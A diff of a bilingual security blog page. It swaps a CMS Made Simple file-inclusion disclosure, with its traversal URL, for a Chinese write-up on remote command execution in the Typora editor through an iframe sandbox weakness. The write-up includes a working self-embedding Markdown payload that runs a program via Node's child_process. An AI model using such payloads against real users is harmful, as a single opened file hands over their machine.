@@ -43,7 +43,7 @@
         en: { title: "Wester's blog — Security Research & AI Tooling", desc: "Security Researcher. Research focus: AI Red Teaming, Mobile Security, Agent Security Governance.", kw: "Browser security, Android Security, Pentest, Offensive Security Research, Security for AI, AI safety" },
         zh: { title: "西风微雨 - Wester's blog", desc: "安全研究员，研究方向：AI 红队 · 移动安全 · agent安全治理", kw: "浏览器安全, Android安全, 渗透测试, 攻击性安全研究, AI安全, 人工智能安全" }
       };
-      var pageTitle = "Local file inclusion in cmsmadesimple <=2.2.1";
+      var pageTitle = "如何在 Typora 编辑器上实现远程命令执行";
       var cur = SEO[lang];
       document.title = (pageTitle ? (pageTitle + ' | ') : '') + cur.title;
       var metaDesc = document.querySelector('meta[name="description"]');
@@ -55,7 +55,7 @@
     })();
   </script>
   <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
-  <title>Local file inclusion in cmsmadesimple &lt;=2.2.1 | Wester's blog — Security Research & AI Tooling</title>
+  <title>如何在 Typora 编辑器上实现远程命令执行 | Wester's blog — Security Research & AI Tooling</title>
   <meta name="description" content="Security Researcher. Research focus: AI Red Teaming, Mobile Security, Agent Security Governance." />
   <meta name="keywords" content="Browser security, Android Security, Pentest, Offensive Security Research, Security for AI, AI safety" />
   <meta name="HandheldFriendly" content="True" />
@@ -64,8 +64,8 @@
   <meta name="generator" content="hexo">
   
   <meta name="theme-color" content="#ffffff" />
-  <link rel="icon" type="image/png" href="/images/static/avatar.png?v=1789832710818" />
-  <link rel="apple-touch-icon" href="/images/static/avatar.png?v=1789832710818" />
+  <link rel="icon" type="image/png" href="/images/static/avatar.png?v=1789832710811" />
+  <link rel="apple-touch-icon" href="/images/static/avatar.png?v=1789832710811" />
 
   
   
@@ -76,7 +76,7 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
   <!-- YOYO Theme Styles -->
-  <link rel="stylesheet" type="text/css" href="/css/screen.css?v=1789832710818" />
+  <link rel="stylesheet" type="text/css" href="/css/screen.css?v=1789832710811" />
   <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500&display=swap" />
 
   
@@ -235,19 +235,19 @@
 <article class="post post-detail">
   
   <header class="article-header">
-    <h1 class="post-title">Local file inclusion in cmsmadesimple &lt;=2.2.1</h1>
+    <h1 class="post-title">如何在 Typora 编辑器上实现远程命令执行</h1>
     <div class="article-meta">
-      <time class="article-date" datetime="2017-05-22">
-        <span class="i18n-zh">2017年5月22日</span>
-        <span class="i18n-en">May 22, 2017</span>
+      <time class="article-date" datetime="2018-12-19">
+        <span class="i18n-zh">2018年12月19日</span>
+        <span class="i18n-en">Dec 19, 2018</span>
       </time>
       <span class="meta-sep">&middot;</span>
-      <span class="article-readtime"><span class="i18n-zh">约 2 分钟</span><span class="i18n-en">2 min read</span></span>
+      <span class="article-readtime"><span class="i18n-zh">约 9 分钟</span><span class="i18n-en">9 min read</span></span>
       
       <span class="meta-sep">&middot;</span>
       <span class="article-tags">
         
-        <a class="post-tag" href="/tags/CVEs-Disclosure/">CVEs Disclosure</a>
+        <a class="post-tag" href="/tags/Vulnerability-Analysis/">Vulnerability Analysis</a>
         
       </span>
       
@@ -260,24 +260,67 @@
   
 
   <section class="post-content">
-    <h2 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h2><p>The File Inclusion vulnerability allows an attacker to include a file, usually exploiting a “dynamic file inclusion” mechanisms implemented in the target application. The vulnerability occurs due to the use of user-supplied input without proper validation.</p>
-<h2 id="Proof-of-concept"><a href="#Proof-of-concept" class="headerlink" title="Proof of concept"></a>Proof of concept</h2><p>cmsmadesimple &lt;&#x3D;2.1.6<br>The vulnerability exists in &#x2F;cmsms&#x2F;admin&#x2F;listtags.php Line 82 and line 54</p>
-<p><img src="/images/posts/cms-vuln-code.png" alt="CMSMadeSimple Vulnerability Code"><br><img src="/images/posts/cms-listtags.png" alt="CMSMadeSimple listtags.php"></p>
-<p>If there is a file named “1.phpinfo.php” existed in <a target="_blank" rel="noopener" href="http://127.0.0.1/1.phpinfo.php">http://127.0.0.1/1.phpinfo.php</a><br>So when we visit the following link:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmsms/admin/listtags.php?_sk_=08852e62af02bc03&amp;action=showpluginhelp&amp;plugin=phpinfo&amp;type=../../1</span><br></pre></td></tr></table></figure>
-<p>You would find out you has include this file successfully!‌</p>
-<p><img src="/images/posts/cms-file-inclusion.png" alt="File Inclusion Successful"></p>
-<ul>
-<li>cmsmadesimple &lt;&#x3D;2.2.1</li>
-</ul>
-<p>Current version is still vulnerable.</p>
-<p><img src="/images/posts/cms-version-check.png" alt="CMSMadeSimple Version Check"></p>
-<p>Disclosure Timelines</p>
-<ul>
-<li>2017&#x2F;2&#x2F;7 Provide vulnerability(2.1.6) detail to vendor but no reply</li>
-<li>2017&#x2F;6&#x2F;16 cmsmadesimple update to 2.2.1 and no reply at all</li>
-<li>2017&#x2F;6&#x2F;28 Public disclosure</li>
-</ul>
+    <blockquote>
+<p>本文原发于知乎专栏，<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/51768716">查看原文</a>。</p>
+</blockquote>
+<h2 id="Typora-简介"><a href="#Typora-简介" class="headerlink" title="Typora 简介"></a>Typora 简介</h2><p>Typora 是一款颜值与实力共存的跨平台 Markdown 编辑器，与 Vscode、Atom、GitHub Desktop 一样，Typora 也基于 Electron 框架进行开发，它抛弃了双栏写作以及写后预览的理念，将写作与预览窗口相结合，重新捡起了富文本「所见即所得」的呈现方式。</p>
+<p>不得不说，在提升便利性和用户体验的同时，也正是自动实时预览的功能给我们的漏洞提升了利用价值，此漏洞已在高于 0.9.9.57 (beta) 的版本进行了修复 —— 见 <a target="_blank" rel="noopener" href="https://typora.io/windows/dev_release.html">Typora for windows - dev version release</a>。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在一个弱小可怜又无助的夜晚，笔者正在用本文的主角 Typora 绞尽脑汁地写文档，由于是第一次使用这个编辑器，笔者的职业病在这时候发作了。</p>
+<p>我们知道，针对 Electron 应用，大部分时候我们只要找到了 XSS 漏洞，也就约等于完成了命令执行。所以，我们祭出祖传的 XSS payload 一顿打，惊喜发现没有任何弹窗。通过简单研究我们发现，Typora 作者在研发的时候采用了 cure53 的 <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify</a> 过滤了预览输出的 html，缓解了大部分的 XSS 攻击。</p>
+<p><strong>那这个编辑器就没有漏洞了吗？</strong></p>
+<p><strong>当然是不可能的。Kein System ist sicher.</strong></p>
+<p>有人可能会想到一个神奇的标签 <code>&lt;iframe&gt;</code>，那我们不如来尝试一下。</p>
+<h3 id="round-1"><a href="#round-1" class="headerlink" title="round 1"></a>round 1</h3><p>输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到 Typora 会把 src 当做相对路径来处理，那如果我们包含一个本地的 html 文件呢？</p>
+<h3 id="round-2"><a href="#round-2" class="headerlink" title="round 2"></a>round 2</h3><p>新建 <code>poc.md</code> 输入：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./poc.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>同目录下的 <code>poc.html</code> 内容如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">top</span>.<span class="title function_">alert</span>(<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们惊喜发现出现了弹窗！</p>
+<p><strong>这个 javascript 为什么执行了呢？</strong></p>
+<p>我们可以通过 Typora 的 dev mode 查看一下页面源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;E:\slide\vul\typora_poc\poc.html&quot;</span> <span class="attr">allow-top-navigation</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allow-forms</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">allow-popups</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;allow-same-origin allow-scripts&quot;</span> <span class="attr">onload</span>=<span class="string">&quot;window.remoteOnLoad(this)&quot;</span> <span class="attr">height</span>=<span class="string">&quot;24&quot;</span> <span class="attr">data-user-height</span>=<span class="string">&quot;24&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们发现有这样一个 sandbox 属性：</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sandbox=&quot;allow-same-origin allow-scripts&quot;</span><br></pre></td></tr></table></figure>
+
+<p>通过查阅文档 <a target="_blank" rel="noopener" href="https://html.spec.whatwg.org/multipage/iframe-embed-object.html#attr-iframe-sandbox">HTML Standard</a> 发现，HTML 5 通过 sandbox 属性提升 iframe 的安全性，我们注意到文档中有一个大大的 warning：</p>
+<blockquote>
+<p>Setting both the allow-scripts and allow-same-origin keywords together when the embedded page has the same origin as the page containing the iframe allows the embedded page to simply remove the sandbox attribute and then reload itself, effectively breaking out of the sandbox altogether.</p>
+</blockquote>
+<p>意思就是如果在 iframe 的 sandbox 属性里同时设置 <code>allow-scripts</code> 和 <code>allow-same-origin</code> 的话，同源的子页面就可以通过 javascript 突破 HTML 5 的沙盒，sandbox 形同虚设。</p>
+<p>这样我们便可以修改一下 poc.html 的源码实现命令执行：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//rce</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">top</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&#x27;C:/Windows/System32/calc.exe&#x27;</span>,<span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>但是现在的漏洞利用起来非常鸡肋，受害者需要下载两个文件，同时保持在一个目录，再打开 poc.md，整个过程比较繁琐，能不能用一个文件实现呢？</strong></p>
+<h3 id="尝试-srcdoc"><a href="#尝试-srcdoc" class="headerlink" title="尝试 srcdoc"></a>尝试 srcdoc</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;window.parent.top.alert(1)&lt;/script&gt;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们发现并没有执行，查看一下源码：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>=<span class="string">&quot;&lt;script&gt;window.parent.top.alert(1)&lt;/script&gt;&quot;</span> <span class="attr">guest-id</span>=<span class="string">&quot;3&quot;</span> <span class="attr">allow-top-navigation</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allow-forms</span>=<span class="string">&quot;false&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">allow-popups</span>=<span class="string">&quot;false&quot;</span> <span class="attr">sandbox</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>iframe 未设置 allow-scripts 的独立属性，同时 sandbox 设置为空字符串，意思是应用所有的沙盒限制，因此使用 srcdoc 的方式不可行。</p>
+<h3 id="尝试引入-md-文件，而非-html-文件"><a href="#尝试引入-md-文件，而非-html-文件" class="headerlink" title="尝试引入 md 文件，而非 html 文件"></a>尝试引入 md 文件，而非 html 文件</h3><p>新建一个 <code>cmd.md</code> 文件，内容与之前 poc.html 一致：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//rce</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">top</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&#x27;C:/Windows/System32/calc.exe&#x27;</span>,<span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用 Typora 打开 poc.md 文件：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./cmd.md&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我们发现是可以继续实行命令执行的，由此可以看出，Typora 在嵌入 md 文件之后，仍会对 md 文件的 html 标签进行解析。</p>
+<h3 id="直接引入-poc-md-自身"><a href="#直接引入-poc-md-自身" class="headerlink" title="直接引入 poc.md 自身"></a>直接引入 poc.md 自身</h3><p>修改 poc.md 文件内容：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;./poc.md&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">//rce</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="property">parent</span>.<span class="property">top</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execFile</span>(<span class="string">&#x27;C:/Windows/System32/calc.exe&#x27;</span>,<span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span>(error)&#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">console</span>.<span class="title function_">log</span>(error);</span></span><br><span class="line"><span class="language-javascript">        &#125;  </span></span><br><span class="line"><span class="language-javascript">        &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>现在，我们只需要发送一个 md 文件给受害者，一旦受害者使用 Typora 打开，我们便可以在受害者的电脑上执行任意命令。</strong></p>
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>随着 Electron 框架在跨平台应用开发市场取得的巨大成功，越来越多的开发者采用 Electron 进行应用开发，那么如何在开发中比较好的避免出现这些风险呢，这里有几个建议：</p>
+<ol>
+<li>采用诸如 <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">cure53&#x2F;DOMPurify</a> 类似的组件过滤用户输入输出，缓解 XSS 漏洞</li>
+<li>各种 HTML 5 的安全属性要正确设置，特别是 iframe 标签</li>
+<li>可以采用 Electron 的 webview 标签去包裹用户内容区，当然也要进行正确的安全设置，参考 <a target="_blank" rel="noopener" href="https://www.electronjs.org/blog/webview-fix">Webview Vulnerability Fix | Electron Blog</a></li>
+<li>避免使用 shell 模块去直接处理 <code>file://</code> 等协议的链接</li>
+</ol>
 
   </section>
 
@@ -290,13 +333,13 @@
     <h4><span class="i18n-zh">分享这篇文章</span><span class="i18n-en">Share this post</span></h4>
     <div class="share-buttons">
         <!-- X (Twitter) -->
-        <a class="icon-x" href="https://x.com/share?url=https://we5ter.github.io/blogs/local-file-inclusion-in-cmsmadesimple/&text=Local file inclusion in cmsmadesimple &lt;=2.2.1"
+        <a class="icon-x" href="https://x.com/share?url=https://we5ter.github.io/blogs/typora-rce-via-iframe-sandbox/&text=如何在 Typora 编辑器上实现远程命令执行"
            onclick="window.open(this.href, 'x-share', 'width=550,height=235');return false;" target="_blank" rel="noopener"
            title="Share on X">
             <img src="/images/static/x-logo.jpg" alt="X" width="22" height="22">
         </a>
         <!-- Weibo -->
-        <a class="icon-weibo" href="https://service.weibo.com/share/share.php?url=https://we5ter.github.io/blogs/local-file-inclusion-in-cmsmadesimple/&title=Local file inclusion in cmsmadesimple &lt;=2.2.1"
+        <a class="icon-weibo" href="https://service.weibo.com/share/share.php?url=https://we5ter.github.io/blogs/typora-rce-via-iframe-sandbox/&title=如何在 Typora 编辑器上实现远程命令执行"
            onclick="window.open(this.href, 'weibo-share', 'width=600,height=500');return false;" target="_blank" rel="noopener"
            title="Share on Weibo">
             <img src="/images/static/weibo.png" alt="Weibo" width="22" height="22">
@@ -309,12 +352,12 @@
         </a>
         <!-- WeChat (copy link) -->
         <a class="icon-wechat" href="javascript:void(0);"
-           onclick="var zh=document.documentElement.getAttribute('data-lang')!=='en';navigator.clipboard.writeText('https://we5ter.github.io/blogs/local-file-inclusion-in-cmsmadesimple/').then(function(){alert(zh?'链接已复制，快去微信分享吧！':'Link copied. Paste it in WeChat to share!');}).catch(function(){prompt(zh?'请手动复制链接：':'Copy this link manually:','https://we5ter.github.io/blogs/local-file-inclusion-in-cmsmadesimple/');});"
+           onclick="var zh=document.documentElement.getAttribute('data-lang')!=='en';navigator.clipboard.writeText('https://we5ter.github.io/blogs/typora-rce-via-iframe-sandbox/').then(function(){alert(zh?'链接已复制，快去微信分享吧！':'Link copied. Paste it in WeChat to share!');}).catch(function(){prompt(zh?'请手动复制链接：':'Copy this link manually:','https://we5ter.github.io/blogs/typora-rce-via-iframe-sandbox/');});"
            title="Copy link for WeChat">
             <img src="/images/static/wechat.svg" alt="WeChat" width="24" height="24">
         </a>
         <!-- LinkedIn -->
-        <a class="icon-linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=https://we5ter.github.io/blogs/local-file-inclusion-in-cmsmadesimple/"
+        <a class="icon-linkedin" href="https://www.linkedin.com/sharing/share-offsite/?url=https://we5ter.github.io/blogs/typora-rce-via-iframe-sandbox/"
            onclick="window.open(this.href, 'linkedin-share', 'width=550,height=500');return false;" target="_blank" rel="noopener"
            title="Share on LinkedIn">
             <img src="/images/static/linkedin-icon.png" alt="LinkedIn" width="22" height="22">
@@ -331,15 +374,15 @@
 <!-- Post Navigation: Previous / Next -->
 <nav class="post-nav">
   
-  <a class="post-nav-prev" href="/blogs/peekaboo-cve-2018-1149-camera-malware/">
+  <a class="post-nav-prev" href="/blogs/zabbix-jsrpc-sqli-analysis/">
     <span class="post-nav-label">&larr; <span class="i18n-zh">上一篇</span><span class="i18n-en">Previous</span></span>
-    <span class="post-nav-title">威胁快讯 | 腾讯 Tencent Blade Team 首度公开，恶意代码威胁全球摄像头</span>
+    <span class="post-nav-title">一个曾经的 Zabbix SQL 注入漏洞分析</span>
   </a>
   
   
-  <a class="post-nav-next" href="/blogs/cve-2017-2500/">
+  <a class="post-nav-next" href="/blogs/peekaboo-cve-2018-1149-camera-malware/">
     <span class="post-nav-label"><span class="i18n-zh">下一篇</span><span class="i18n-en">Next</span> &rarr;</span>
-    <span class="post-nav-title">(CVE-2017-2500)Address bar spoofing on macOS Safari</span>
+    <span class="post-nav-title">威胁快讯 | 腾讯 Tencent Blade Team 首度公开，恶意代码威胁全球摄像头</span>
   </a>
   
 </nav>
